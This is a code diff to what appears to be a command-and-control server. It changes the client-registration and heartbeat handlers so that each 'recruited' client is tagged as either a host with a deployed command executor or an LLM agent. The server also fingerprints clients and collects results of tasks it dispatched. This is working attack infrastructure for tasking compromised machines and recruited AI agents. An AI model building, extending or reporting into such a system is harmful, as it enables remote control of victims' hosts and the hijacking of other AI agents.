@@ -721,7 +721,7 @@ def portal_client_register(request: Request, ticket: str = ""):
             {"status": "rate_limited", "retry_after_s": 3600}, status_code=429
         )
     fingerprint = identify_from_headers(dict(request.headers))
-    metadata: dict = {"recruited_via": "portal_api"}
+    metadata: dict = {"recruited_via": "portal_api", "control_plane": "agent"}
     if ticket:
         metadata["recruit_src"] = ticket[:64]
     if fingerprint:
@@ -830,6 +830,17 @@ async def portal_client_heartbeat(request: Request):
         )
         if not agent:
             return JSONResponse({"status": "unknown_client", "hint": "请先调用 client-register"}, status_code=404)
+        # Control-plane attribution: a resident node-agent beacon beats with
+        # its own UA — that identity is host-controlled (command executor
+        # deployed). Everything else (manual API heartbeats from LLM agents)
+        # stays on the agent-control plane (runbook checks).
+        _ua = (request.headers.get("user-agent") or "").lower()
+        if "staging-node-agent" in _ua:
+            meta = dict(agent.metadata_json or {})
+            if meta.get("control_plane") != "host":
+                meta["control_plane"] = "host"
+                agent.metadata_json = meta
+                db.add(agent)
         # Stable-channel result path: results[] mirrors /c2/heartbeat —
         # recruited agents close dispatched tasks from the same round trip.
         for item in results[:50]:
